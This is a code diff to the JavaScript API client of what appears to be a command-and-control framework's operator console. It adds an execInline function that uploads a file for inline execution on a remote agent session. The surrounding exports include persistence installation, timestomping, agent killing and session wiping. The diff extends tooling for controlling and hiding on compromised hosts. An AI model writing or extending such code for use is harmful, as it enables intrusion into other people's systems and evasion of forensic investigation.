@@ -118,6 +118,23 @@ const API = (() => {
     if (!res.ok) throw { status: res.status, message: data.detail || `HTTP ${res.status}` };
     return data;
   }
+
+  async function execInline(id, execType, file, args) {
+    const form = new FormData();
+    form.append('file', file);
+    const url = `/api/v1/sessions/${id}/exec/inline?exec_type=${encodeURIComponent(execType)}&args=${encodeURIComponent(args || '')}`;
+    let res;
+    try {
+      res = await fetch(url, { method: 'POST', credentials: 'same-origin', body: form });
+    } catch (e) {
+      throw { status: 0, message: 'Network error: ' + e.message };
+    }
+    let data;
+    try { data = await res.json(); } catch { data = {}; }
+    if (!res.ok) throw { status: res.status, message: data.detail || `HTTP ${res.status}` };
+    return data;
+  }
+
   function history(id)                   { return get(`/api/v1/sessions/${id}/history`); }
   function artifacts(id)                 { return get(`/api/v1/sessions/${id}/artifacts`); }
   function downloadedFiles(id)           { return get(`/api/v1/sessions/${id}/downloads`); }
@@ -203,7 +220,7 @@ const API = (() => {
     sessions, session, killSession, wipeSession,
     sendCommand, sysinfo, sleep, jitter, killAgent,
     persist, persistProbe, persistInstall, persistRemove, persistStatus,
-    timestomp, download, uploadFile,
+    timestomp, download, uploadFile, execInline,
     history, artifacts, downloadedFiles, staging, stagingFile, downloadedFileUrl,
     stopPolling, resumePolling, deleteDownload, listUploads, markUploadRemoved, restoreUpload,
     providers, startDeploy, cancelDeploy, deployStreamUrl, oauthExchange, oauthStart, oauthResult,
